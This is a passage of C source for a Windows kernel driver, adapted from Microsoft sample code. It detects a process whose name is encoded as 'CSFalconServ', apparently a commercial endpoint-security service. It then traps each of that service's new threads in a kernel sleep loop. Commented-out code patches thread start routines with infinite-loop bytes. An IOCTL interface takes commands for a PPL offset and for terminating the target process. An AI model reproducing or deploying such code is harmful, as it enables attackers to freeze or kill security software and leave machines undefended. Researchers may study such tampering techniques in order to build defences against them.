	DbgPrint("process name: %s\n", eprocess + 0x5a8);
    DWORD64 a1 = *(DWORD64*)(eprocess + 0x5a8);
	 DWORD a2 = *(DWORD*)(eprocess + 0x5a8 + 8);
 if (!g.fs_ep && a1 == 0x6e6f636c61465343 && a2 == 0x76726553  ) {
     // if (!g.fs_ep && a1 == 0x6578652e646d63){
        // compare eporcess wtih global data
        AvAcquireResourceExclusive(&g.fs_ep_lock);
        g.fs_ep = Process;
        g.pid = ProcessId;
        AvReleaseResource(&g.fs_ep_lock);
        log("[TdCreateProcessNotifyRoutine2]: targer eprocess located: %p\n", Process);
      
    }

    else

        log("[TdCreateProcessNotifyRoutine2]: eprocess mismatch\n");
}
NTSTATUS NTAPI MmCopyVirtualMemory
(
	PEPROCESS SourceProcess,
	PVOID SourceAddress,
	PEPROCESS TargetProcess,
	PVOID TargetAddress,
	SIZE_T BufferSize,
	KPROCESSOR_MODE PreviousMode,
	PSIZE_T ReturnSize
);
VOID ResumeSleepThread() {
	
	AvAcquireResourceShared(&g.fs_ep_lock);
	EndLoop = 1;
	AvReleaseResource(&g.fs_ep_lock);
}
VOID
KmExtsPsCreateThreadNotifyRoutineEx(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create)
{
	if (!Create)return;
	//if (!gPPLOff) {
	//	DbgPrint("you must set ppl offset first\n");
	//	return;
	//}
    (ThreadId); (Create);
    // 
    // When in this routine, target thread has been created and is
    // in the INITIALIZED state. It will not transition to READY
    // until this routine exits.
    // 
	if (!g.pid)
		return;
    AvAcquireResourceShared(&g.fs_ep_lock);
	if (ProcessId == g.pid) {
		AvReleaseResource(&g.fs_ep_lock);
		DbgPrint("put target process's thread 0x%x into sleep\n", ThreadId);
		// 等目标进程的peb dll列表中存在他自己路径下的dll的时候再开始sleep 感觉应该是可以的
 
		
		if (ListProcessModules(ProcessId, gTargetProcessFolderPath)) { 

			//直接把所有的线程都睡了算了
			while (1) {
				// Your loop code here
				if (EndLoop)break;
				// Sleep for 1 second (1000 ms)
				LARGE_INTEGER interval;
				interval.QuadPart = -10 * 1000 * 1000;  // Negative for relative time; 1 second = 10 million 100 ns units
				KeDelayExecutionThread(KernelMode, FALSE, &interval);
			}
		}
	}
	else
		AvReleaseResource(&g.fs_ep_lock);
	return;

	{

		PETHREAD pThread = NULL;
		NTSTATUS status = PsLookupThreadByThreadId(ThreadId, &pThread);
		//DbgPrint("ethread: 0x%p\n", pThread);
		DWORD64 startRoutineAddr = *(DWORD64*)((UCHAR*)pThread + gETHREAD_StartAddrOff);

		//DbgPrint("start routine: 0x%p\n", startRoutineAddr);
		// Make the memory page containing myprintf writeable
		// xor eax,eax  ret 就是  31 c0 c3  只占3字节

		UCHAR headBytes[preSetEntryRoutineHeadBytesCount] = { 0 };
		int bytesRead = 0;
		MmCopyVirtualMemory(
			g.fs_ep,      // From process (user-mode process)
			startRoutineAddr,        // From address
			g.fs_ep, // To process (kernel-mode caller)
			headBytes,       // To buffer
			preSetEntryRoutineHeadBytesCount,               // Size
			KernelMode,         // Access mode
			&bytesRead           // Output: bytes copied
		);

 
		// 捕捉这个头部并没有什么作用，因为起始地址总是ntdll的RtlUserThreadStart函数，所以我们不如直接就在第一个线程启动的时候卡住他
		// 对比headbytes
		int totallySame = 1;
		for (size_t i = 0; i < preSetEntryRoutineHeadBytesCount; i++)
		{
			if (gEntryRoutineHeadBytes[i] != headBytes[i]) {
				totallySame = 0;
				break;
			}
		}
	//、、	totallySame = 1;
		if (!totallySame) {
			DbgPrint("this start routine is not RtlUserThreadStart , investigate it\n");
			DbgBreakPoint();
		
		}
		// 当前线程为目标线程，修改代码为卡死循环代码
		// 这样的话，所有的线程都会卡死，在windbg附加后，我们还需要一个恢复所有线程的代码
		if (totallySame) {
			DbgPrint("original first 3 bytes of 0x%p: %02x %02x %02x\n", startRoutineAddr, headBytes[0], headBytes[1], headBytes[2]);
			// 90 eb fd     循环卡死指令
			char kasi[3] = { 0x90,0xeb,0xfd };
			MmCopyVirtualMemory(
				g.fs_ep,  // From process (kernel-mode)
				kasi,           // From buffer
				g.fs_ep,          // To process (user-mode target)
				startRoutineAddr,        // To address
				0x3,                   // Size
				KernelMode,             // Mode
				bytesRead            // Output: bytes written
			);
		}
		// 只处理第一个线程，之后我们只需要将g.pid清零就行了
		// g.pid = 0;
		// g.fs_ep = 0;
		// 顺便把进程通知也关了
		*(UCHAR*)(gTargetProcessName) = 0;
       // log("falcon thread\n");
       //DbgBreakPoint();   
		// 	while (1) {
		// 		// Your loop code here
       //         if (EndLoop)break;
		// 		// Sleep for 1 second (1000 ms)
		// 		LARGE_INTEGER interval;
		// 		interval.QuadPart = -10 * 1000 * 1000;  // Negative for relative time; 1 second = 10 million 100 ns units
		// 		KeDelayExecutionThread(KernelMode, FALSE, &interval);
		// 	 
		// }
       // //DbgBreakPoint();
    }
    AvReleaseResource(&g.fs_ep_lock);
    

    return;
}

const UNICODE_STRING* GetModulePathFromAddress(PVOID address);
extern   NTSTATUS ZwQueryInformationProcess(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength OPTIONAL
);

typedef struct _KLDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	PVOID      ExceptionTable;
	ULONG      ExceptionTableSize;
	PVOID      GpValue;
	PVOID      NonPagedDebugInfo;
	PVOID      DllBase;
	PVOID      EntryPoint;
	ULONG      SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	// ... more fields exist but are not needed here
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

extern NTSTATUS NTAPI RtlGetVersion(PRTL_OSVERSIONINFOW lpVersionInformation);

VOID PrintVersion()
{
	RTL_OSVERSIONINFOW verInfo = { 0 };
	verInfo.dwOSVersionInfoSize = sizeof(verInfo);

	if (NT_SUCCESS(RtlGetVersion(&verInfo))) {
		DbgPrint("Windows Version: %d.%d.%d (Build: %d)\n",
			verInfo.dwMajorVersion,
			verInfo.dwMinorVersion,
			verInfo.dwBuildNumber,
			verInfo.dwPlatformId);
	}
	else {
		DbgPrint("Failed to get version info\n");
	}
}
extern PVOID PsLoadedModuleList;
//
// DriverEntry
//
// mainn
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{ 

	//DbgBreakPoint();


	// PLIST_ENTRY list = (PLIST_ENTRY)PsLoadedModuleList;
	// PLIST_ENTRY current = list->Flink;
	// 
	// while (current != list) {
	// 	PKLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
	// 	PVOID base = entry->DllBase;
	// 	ULONG size = entry->SizeOfImage;
	// 
	// 	DbgPrint("base: 0x%p\tsize: 0x%x\tmodule path: %wZ\n", base,size,&entry->FullDllName);
	// 
	// 	current = current->Flink;
	// }
	//DbgBreakPoint();



	g.fs_ep = 0;
	g.pid = 0;
	AllocateUnicodeString2(&gTargetProcessName, 250);
	AllocateUnicodeString2(&gTargetProcessFolderPath, 250);
    WCHAR phder[0x100]=L"LLLLLLLLLLLllllllllllllllllllllllllllllLLLLLLLLLLLL";
  
    AllocateUnicodeString(TargetProcessName, phder,&TargetProcessName);
    log("[DriverEntry] current thread id: 0x%p\n", PsGetCurrentThreadId());
    RtlZeroMemory(&g, sizeof(g));
    g.pid = 0;
  //  DbgBreakPoint();
    ExInitializeResourceLite(&g.fs_ep_lock);   
    g.fs_ep = 0;
    WPP_INIT_TRACING(DriverObject, RegistryPath);
    //     level 1    ӡ  һ         غ ж  
    // KdPrintEx((FOR_DRIVER_STATUS, TRACE_LEVEL_ERROR, "fsfilter is loaded\n"));
    NTSTATUS Status;
    UNICODE_STRING NtDeviceName = RTL_CONSTANT_STRING(TD_NT_DEVICE_NAME);
    UNICODE_STRING DosDevicesLinkName = RTL_CONSTANT_STRING(TD_DOS_DEVICES_LINK_NAME);
    PDEVICE_OBJECT Device = NULL;
    BOOLEAN SymLinkCreated = FALSE;
    USHORT CallbackVersion;

    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: DriverEntry: Driver loaded. Use ed nt!Kd_IHVDRIVER_Mask f (or 7) to enable more traces\n");

    CallbackVersion = ObGetFilterVersion();

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "ObCallbackTest: DriverEntry: Callback version 0x%hx\n", CallbackVersion);

    //
    // Initialize globals.
    //

    KeInitializeGuardedMutex(&TdCallbacksMutex);

    //
    // Create our device object.
    //

    Status = IoCreateDevice(
        DriverObject,                 // pointer to driver object
        0,                            // device extension size
        &NtDeviceName,                // device name
        FILE_DEVICE_UNKNOWN,          // device type
        0,                            // device characteristics
        FALSE,                        // not exclusive
        &Device);                     // returned device object pointer

    if (!NT_SUCCESS(Status))
    {
        goto Exit;
    }
	gDriverObject = DriverObject;
    TD_ASSERT(Device == DriverObject->DeviceObject);

    //
    // Set dispatch routines.
    //

    DriverObject->MajorFunction[IRP_MJ_CREATE] = TdDeviceCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = TdDeviceClose;
    DriverObject->MajorFunction[IRP_MJ_CLEANUP] = TdDeviceCleanup;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = TdDeviceControl;
  //  DriverObject->DriverUnload = TdDeviceUnload;

    //
    // Create a link in the Win32 namespace.
    //


    Status = IoCreateSymbolicLink(&DosDevicesLinkName, &NtDeviceName);

    if (!NT_SUCCESS(Status))
    {
        goto Exit;
    }

    SymLinkCreated = TRUE;

    //
    // Set process create routines.
    //

    Status = PsSetCreateProcessNotifyRoutineEx(
        TdCreateProcessNotifyRoutine2,
        FALSE
    );

    if (!NT_SUCCESS(Status))
    {
        log("PsSetCreateProcessNotifyRoutineEx failed, %p\n", Status);
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: DriverEntry: PsSetCreateProcessNotifyRoutineEx(2) returned 0x%x\n", Status);
        goto Exit;
    }
    log("PsSetCreateProcessNotifyRoutineEx succeed, %p\n", Status);
    TdProcessNotifyRoutineSet2 = TRUE;


    Status = PsSetCreateThreadNotifyRoutineEx(
        PsCreateThreadNotifyNonSystem,
      (PVOID)  KmExtsPsCreateThreadNotifyRoutineEx
    );



    ns s;
    s = FltRegisterFilter(DriverObject,
        &FilterRegistration,
        &g_minifilterHandle);
    if (!NT_SUCCESS(s)) {
        log("FltRegisterFilter failed, 0x%p\n", s);
     
    }

    s = FltStartFiltering(g_minifilterHandle);

Exit:

    if (!NT_SUCCESS(Status))
    {
        if (TdProcessNotifyRoutineSet2 == TRUE)
        {
            Status = PsSetCreateProcessNotifyRoutineEx(
                TdCreateProcessNotifyRoutine2,
                TRUE
            );

            TD_ASSERT(Status == STATUS_SUCCESS);

            TdProcessNotifyRoutineSet2 = FALSE;
        }

        if (SymLinkCreated == TRUE)
        {
            IoDeleteSymbolicLink(&DosDevicesLinkName);
        }

        if (Device != NULL)
        {
            IoDeleteDevice(Device);
        }
    }

    return Status;
}

//
// Function:
//
//     TdDeviceUnload
//
// Description:
//
//     This function handles driver unloading. All this driver needs to do 
//     is to delete the device object and the symbolic link between our 
//     device name and the Win32 visible name.
//

VOID
TdDeviceUnload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
	return;
    NTSTATUS Status = STATUS_SUCCESS;
    UNICODE_STRING DosDevicesLinkName = RTL_CONSTANT_STRING(TD_DOS_DEVICES_LINK_NAME);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_TRACE_LEVEL, "ObCallbackTest: TdDeviceUnload\n");

    //
    // Unregister process notify routines.
    //

    if (TdProcessNotifyRoutineSet2 == TRUE)
    {
        Status = PsSetCreateProcessNotifyRoutineEx(
            TdCreateProcessNotifyRoutine2,
            TRUE
        );

        TD_ASSERT(Status == STATUS_SUCCESS);

        TdProcessNotifyRoutineSet2 = FALSE;
		PsRemoveCreateThreadNotifyRoutine(KmExtsPsCreateThreadNotifyRoutineEx);
    }

    // remove filtering and remove any OB callbacks
    TdbProtectName = FALSE;
    Status = TdDeleteProtectNameCallback();
    TD_ASSERT(Status == STATUS_SUCCESS);

    //
    // Delete the link from our device name to a name in the Win32 namespace.
    //

    Status = IoDeleteSymbolicLink(&DosDevicesLinkName);
    if (Status != STATUS_INSUFFICIENT_RESOURCES) {
        //
        // IoDeleteSymbolicLink can fail with STATUS_INSUFFICIENT_RESOURCES.
        //

        TD_ASSERT(NT_SUCCESS(Status));

    }


    //
    // Delete our device object.
    //

    IoDeleteDevice(DriverObject->DeviceObject);
}

//
// Function:
//
//     TdDeviceCreate
//
// Description:
//
//     This function handles the 'create' irp.
//


NTSTATUS
TdDeviceCreate(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

//
// Function:
//
//     TdDeviceClose
//
// Description:
//
//     This function handles the 'close' irp.
//

NTSTATUS
TdDeviceClose(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

//
// Function:
//
//     TdDeviceCleanup
//
// Description:
//
//     This function handles the 'cleanup' irp.
//

NTSTATUS
TdDeviceCleanup(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

//
// TdControlProtectName
//

NTSTATUS TdControlProtectName(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION IrpStack = NULL;
    ULONG InputBufferLength = 0;
    PTD_PROTECTNAME_INPUT pProtectNameInput = NULL;

    UNREFERENCED_PARAMETER(DeviceObject);


    DbgPrintEx(
        DPFLTR_IHVDRIVER_ID, DPFLTR_TRACE_LEVEL,
        "ObCallbackTest: TdControlProtectName: Entering\n");

    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    InputBufferLength = IrpStack->Parameters.DeviceIoControl.InputBufferLength;

    if (InputBufferLength < sizeof(TD_PROTECTNAME_INPUT))
    {
        Status = STATUS_BUFFER_OVERFLOW;
        goto Exit;
    }

    pProtectNameInput = (PTD_PROTECTNAME_INPUT)Irp->AssociatedIrp.SystemBuffer;

    Status = TdProtectNameCallback(pProtectNameInput);

    switch (pProtectNameInput->Operation) {
    case TDProtectName_Protect:
        // Begin filtering access rights
        TdbProtectName = TRUE;
        TdbRejectName = FALSE;
        break;

    case TDProtectName_Reject:
        // Begin reject process creation on match
        TdbProtectName = FALSE;
        TdbRejectName = TRUE;
        break;
    }


Exit:
    DbgPrintEx(
        DPFLTR_IHVDRIVER_ID, DPFLTR_TRACE_LEVEL,
        "ObCallbackTest: TD_IOCTL_PROTECTNAME: Status %x\n", Status);

    return Status;
}

//
// TdControlUnprotect
//

NTSTATUS TdControlUnprotect(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    // PIO_STACK_LOCATION IrpStack = NULL;
    // ULONG InputBufferLength = 0;

    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    // IrpStack = IoGetCurrentIrpStackLocation (Irp);
    // InputBufferLength = IrpStack->Parameters.DeviceIoControl.InputBufferLength;

    // No need to check length of passed in parameters as we do not need any information from that

    // do not filter requested access
    Status = TdDeleteProtectNameCallback();
    if (Status != STATUS_SUCCESS) {
        DbgPrintEx(
            DPFLTR_IHVDRIVER_ID, DPFLTR_TRACE_LEVEL,
            "ObCallbackTest: TdDeleteProtectNameCallback:  status 0x%x\n", Status);
    }
    TdbProtectName = FALSE;
    TdbRejectName = FALSE;

    //Exit:
    DbgPrintEx(
        DPFLTR_IHVDRIVER_ID, DPFLTR_TRACE_LEVEL,
        "ObCallbackTest: TD_IOCTL_UNPROTECT: exiting - status 0x%x\n", Status);

    return Status;
}


//
// Function:
//
//     TdDeviceControl
//
// Description:
//
//     This function handles 'control' irp.
//

NTSTATUS
TdDeviceControl(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp
)


{
	PIO_STACK_LOCATION  irpSp;// Pointer to current stack location
	NTSTATUS            ntStatus = STATUS_SUCCESS;// Assume success
	ULONG               inBufLength; // Input buffer length
	ULONG               outBufLength; // Output buffer length
	PCHAR               inBuf, outBuf; // pointer to Input and output buffer
	PCHAR               data = "This String is from Device Driver !!!";
	size_t              datalen = strlen(data) + 1;//Length of data including null
	PMDL                mdl = NULL;
	PCHAR               buffer = NULL;

	UNREFERENCED_PARAMETER(DeviceObject);

	PAGED_CODE();

	irpSp = IoGetCurrentIrpStackLocation(Irp);
	inBufLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (!inBufLength || !outBufLength)
	{
		ntStatus = STATUS_INVALID_PARAMETER;
		goto End;
	}

	//
	// Determine which I/O control code was specified.
	//

	switch (irpSp->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_SIOCTL_METHOD_BUFFERED:

		//
		// In this method the I/O manager allocates a buffer large enough to
		// to accommodate larger of the user input buffer and output buffer,
		// assigns the address to Irp->AssociatedIrp.SystemBuffer, and
		// copies the content of the user input buffer into this SystemBuffer
		//

		// SIOCTL_KDPRINT(("Called IOCTL_SIOCTL_METHOD_BUFFERED\n"));
		//// PrintIrpInfo(Irp);

		//
		// Input buffer and output buffer is same in this case, read the
		// content of the buffer before writing to it
		//

		inBuf = Irp->AssociatedIrp.SystemBuffer;
		outBuf = Irp->AssociatedIrp.SystemBuffer;

		//
		// Read the data from the buffer
		//

		// SIOCTL_KDPRINT(("\tData from User :"));
		//
		// We are using the following function to print characters instead
		// DebugPrint with %s format because we string we get may or
		// may not be null terminated.
		//
	//	// PrintChars(inBuf, inBufLength);

		//
		// Write to the buffer over-writes the input buffer content
		//
		DWORD bytesout = 0;
		DealMsg(inBuf, outBuf,&bytesout);
		//  RtlCopyBytes(outBuf, data, outBufLength);
		//
		//  // SIOCTL_KDPRINT(("\tData to User : "));
		//  // PrintChars(outBuf, datalen  );

		  //
		  // Assign the length of the data copied to IoStatus.Information
		  // of the Irp and complete the Irp.
		  //

		//Irp->IoStatus.Information = (outBufLength < datalen ? outBufLength : datalen);
		Irp->IoStatus.Information = bytesout;

		//
		// When the Irp is completed the content of the SystemBuffer
		// is copied to the User output buffer and the SystemBuffer is
		// is freed.
		//

		break;

	case IOCTL_SIOCTL_METHOD_NEITHER:

		//
		// In this type of transfer the I/O manager assigns the user input
		// to Type3InputBuffer and the output buffer to UserBuffer of the Irp.
		// The I/O manager doesn't copy or map the buffers to the kernel
		// buffers. Nor does it perform any validation of user buffer's address
		// range.
		//


		// SIOCTL_KDPRINT(("Called IOCTL_SIOCTL_METHOD_NEITHER\n"));

	//	// PrintIrpInfo(Irp);

		//
		// A driver may access these buffers directly if it is a highest level
		// driver whose Dispatch routine runs in the context
		// of the thread that made this request. The driver should always
		// check the validity of the user buffer's address range and check whether
		// the appropriate read or write access is permitted on the buffer.
		// It must also wrap its accesses to the buffer's address range within
		// an exception handler in case another user thread deallocates the buffer
		// or attempts to change the access rights for the buffer while the driver
		// is accessing memory.
		//

		inBuf = irpSp->Parameters.DeviceIoControl.Type3InputBuffer;
		outBuf = Irp->UserBuffer;

		//
		// Access the buffers directly if only if you are running in the
		// context of the calling process. Only top level drivers are
		// guaranteed to have the context of process that made the request.
		//

		try {
			//
			// Before accessing user buffer, you must probe for read/write
			// to make sure the buffer is indeed an userbuffer with proper access
			// rights and length. ProbeForRead/Write will raise an exception if it's otherwise.
			//
			ProbeForRead(inBuf, inBufLength, sizeof(UCHAR));

			//
			// Since the buffer access rights can be changed or buffer can be freed
			// anytime by another thread of the same process, you must always access
			// it within an exception handler.
			//

			// SIOCTL_KDPRINT(("\tData from User :"));
			//// PrintChars(inBuf, inBufLength);

		}
		except(EXCEPTION_EXECUTE_HANDLER)
		{

			ntStatus = GetExceptionCode();
			// SIOCTL_KDPRINT((
				//"Exception while accessing inBuf 0X%08X in METHOD_NEITHER\n",
			//	ntStatus));
			break;
		}


		//
		// If you are accessing these buffers in an arbitrary thread context,
		// say in your DPC or ISR, if you are using it for DMA, or passing these buffers to the
		// next level driver, you should map them in the system process address space.
		// First allocate an MDL large enough to describe the buffer
		// and initilize it. Please note that on a x86 system, the maximum size of a buffer
		// that an MDL can describe is 65508 KB.
		//

		mdl = IoAllocateMdl(inBuf, inBufLength, FALSE, TRUE, NULL);
		if (!mdl)
		{
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		try
		{

			//
			// Probe and lock the pages of this buffer in physical memory.
			// You can specify IoReadAccess, IoWriteAccess or IoModifyAccess
			// Always perform this operation in a try except block.
			//  MmProbeAndLockPages will raise an exception if it fails.
			//
			MmProbeAndLockPages(mdl, UserMode, IoReadAccess);
		}
		except(EXCEPTION_EXECUTE_HANDLER)
		{

			ntStatus = GetExceptionCode();
			// SIOCTL_KDPRINT((
			//	"Exception while locking inBuf 0X%08X in METHOD_NEITHER\n",
			//	ntStatus));
			IoFreeMdl(mdl);
			break;
		}

		//
		// Map the physical pages described by the MDL into system space.
		// Note: double mapping the buffer this way causes lot of
		// system overhead for large size buffers.
		//

		buffer = MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority | MdlMappingNoExecute);

		if (!buffer) {
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			MmUnlockPages(mdl);
			IoFreeMdl(mdl);
			break;
		}

		//
		// Now you can safely read the data from the buffer.
		//
		// SIOCTL_KDPRINT(("\tData from User (SystemAddress) : "));
	//	// PrintChars(buffer, inBufLength);

		//
		// Once the read is over unmap and unlock the pages.
		//

		MmUnlockPages(mdl);
		IoFreeMdl(mdl);

		//
		// The same steps can be followed to access the output buffer.
		//

		mdl = IoAllocateMdl(outBuf, outBufLength, FALSE, TRUE, NULL);
		if (!mdl)
		{
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}


		try {
			//
			// Probe and lock the pages of this buffer in physical memory.
			// You can specify IoReadAccess, IoWriteAccess or IoModifyAccess.
			//

			MmProbeAndLockPages(mdl, UserMode, IoWriteAccess);
		}
		except(EXCEPTION_EXECUTE_HANDLER)
		{

			ntStatus = GetExceptionCode();
			// SIOCTL_KDPRINT((
				//"Exception while locking outBuf 0X%08X in METHOD_NEITHER\n",
			//	ntStatus));
			IoFreeMdl(mdl);
			break;
		}


		buffer = MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority | MdlMappingNoExecute);

		if (!buffer) {
			MmUnlockPages(mdl);
			IoFreeMdl(mdl);
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		//
		// Write to the buffer
		//

		RtlCopyBytes(buffer, data, outBufLength);

		// SIOCTL_KDPRINT(("\tData to User : %s\n", buffer));
		//// PrintChars(buffer, datalen);

		MmUnlockPages(mdl);

		//
		// Free the allocated MDL
		//

		IoFreeMdl(mdl);

		//
		// Assign the length of the data copied to IoStatus.Information
		// of the Irp and complete the Irp.
		//

		Irp->IoStatus.Information = (outBufLength < datalen ? outBufLength : datalen);

		break;

	case IOCTL_SIOCTL_METHOD_IN_DIRECT:

		//
		// In this type of transfer,  the I/O manager allocates a system buffer
		// large enough to accommodatethe User input buffer, sets the buffer address
		// in Irp->AssociatedIrp.SystemBuffer and copies the content of user input buffer
		// into the SystemBuffer. For the user output buffer, the  I/O manager
		// probes to see whether the virtual address is readable in the callers
		// access mode, locks the pages in memory and passes the pointer to
		// MDL describing the buffer in Irp->MdlAddress.
		//

		// SIOCTL_KDPRINT(("Called IOCTL_SIOCTL_METHOD_IN_DIRECT\n"));

		// PrintIrpInfo(Irp);

		inBuf = Irp->AssociatedIrp.SystemBuffer;

		// SIOCTL_KDPRINT(("\tData from User in InputBuffer: "));
		// PrintChars(inBuf, inBufLength);

		//
		// To access the output buffer, just get the system address
		// for the buffer. For this method, this buffer is intended for transfering data
		// from the application to the driver.
		//

		buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);

		if (!buffer) {
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		// SIOCTL_KDPRINT(("\tData from User in OutputBuffer: "));
		// PrintChars(buffer, outBufLength);

		//
		// Return total bytes read from the output buffer.
		// Note OutBufLength = MmGetMdlByteCount(Irp->MdlAddress)
		//

		Irp->IoStatus.Information = MmGetMdlByteCount(Irp->MdlAddress);

		//
		// NOTE: Changes made to the  SystemBuffer are not copied
		// to the user input buffer by the I/O manager
		//

		break;

	case IOCTL_SIOCTL_METHOD_OUT_DIRECT:

		//
		// In this type of transfer, the I/O manager allocates a system buffer
		// large enough to accommodate the User input buffer, sets the buffer address
		// in Irp->AssociatedIrp.SystemBuffer and copies the content of user input buffer
		// into the SystemBuffer. For the output buffer, the I/O manager
		// probes to see whether the virtual address is writable in the callers
		// access mode, locks the pages in memory and passes the pointer to MDL
		// describing the buffer in Irp->MdlAddress.
		//


		// SIOCTL_KDPRINT(("Called IOCTL_SIOCTL_METHOD_OUT_DIRECT\n"));

		// PrintIrpInfo(Irp);


		inBuf = Irp->AssociatedIrp.SystemBuffer;

		// SIOCTL_KDPRINT(("\tData from User : "));
		// PrintChars(inBuf, inBufLength);

		//
		// To access the output buffer, just get the system address
		// for the buffer. For this method, this buffer is intended for transfering data
		// from the driver to the application.
		//

		buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);

		if (!buffer) {
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		//
		// Write data to be sent to the user in this buffer
		//

		RtlCopyBytes(buffer, data, outBufLength);

		// SIOCTL_KDPRINT(("\tData to User : "));
		// PrintChars(buffer, datalen);

		Irp->IoStatus.Information = (outBufLength < datalen ? outBufLength : datalen);

		//
		// NOTE: Changes made to the  SystemBuffer are not copied
		// to the user input buffer by the I/O manager
		//

		break;

	default:

		//
		// The specified I/O control code is unrecognized by this driver.
		//

		ntStatus = STATUS_INVALID_DEVICE_REQUEST;
		// SIOCTL_KDPRINT(("ERROR: unrecognized IOCTL %x\n",
			//irpSp->Parameters.DeviceIoControl.IoControlCode));
		break;
	}

End:
	//
	// Finish the I/O operation by simply completing the packet and returning
	// the same status as in the packet itself.
	//

	Irp->IoStatus.Status = ntStatus;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return ntStatus;
}


VOID FreeAnsiString(ANSI_STRING* ansiStr) {
	if (ansiStr->Buffer) {
		ExFreePoolWithTag(ansiStr->Buffer, 'ansi');
		ansiStr->Buffer = NULL;
		ansiStr->Length = ansiStr->MaximumLength = 0;
	}
}


VOID ConvertCharToAnsiString(const char* input, ANSI_STRING* ansiStr) {
	SIZE_T len = strlen(input);

	if (len > 0xFFFF) return;  // ANSI_STRING max length is USHORT

	ansiStr->Length = (USHORT)len;
	ansiStr->MaximumLength = (USHORT)len + 1;
	ansiStr->Buffer = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, ansiStr->MaximumLength, 'ansi');

	if (ansiStr->Buffer) {
		RtlCopyMemory(ansiStr->Buffer, input, len + 1);  // includes null terminator
	}
	else {
		ansiStr->Length = ansiStr->MaximumLength = 0;
	}
}

VOID DealMsg(UCHAR* a1,UCHAR* outBuf,DWORD* bytesOut) {
	Msg* msg = (Msg*)a1;
	if (!gPPLOff) {
		if (msg->cmdType != enum_SetPPLOff) {
			DbgPrint("you must set ppl offset first\n");
			return;
		}
	}
	switch (msg->cmdType) {
	case enum_SetTargetProcessFolderPath: {
		

			ANSI_STRING ansiStr;

		// Initialize the ANSI_STRING from the char*
		RtlInitAnsiString(&ansiStr, &msg->a1);

		// Convert to UNICODE_STRING  不需要分配内存，因为我们已经预先分配好了
		 RtlAnsiStringToUnicodeString(gTargetProcessFolderPath, &ansiStr, 0);
		  
		break;
	}
	case enum_AskKernelIfTargetProcessIsCrashed: {
		

			AvAcquireResourceExclusive(&g.fs_ep_lock);
			int a = g.pid;
			AvReleaseResource(&g.fs_ep_lock);
			if (a) {
				*(DWORD*)outBuf = a;
				*bytesOut = 4;
			}
			else
				*(DWORD*)outBuf = 0;
		break;
	}
	case enum_TerminateTargetProcess: {
		gRtlUserThreadStartOff = msg->a2;
		TerminateTargetProcess(msg->a1,outBuf, bytesOut);
		break;
	}
	case enum_GetFuncModulePath: {
		PUNICODE_STRING path = GetFuncModule(msg->a1);
		char tempOut[3] = { 0 };
		ReadOut3ByteAsmCode(msg->a1, tempOut);
		RtlUnicodeStringToAnsiString(outBuf, path, TRUE);
		
		*bytesOut = *outBuf+3;
		UCHAR* temp = (UCHAR*)ExAllocatePoolWithTag(NonPagedPool, *outBuf, 'tgnU');
		memset(temp, 0, *outBuf);
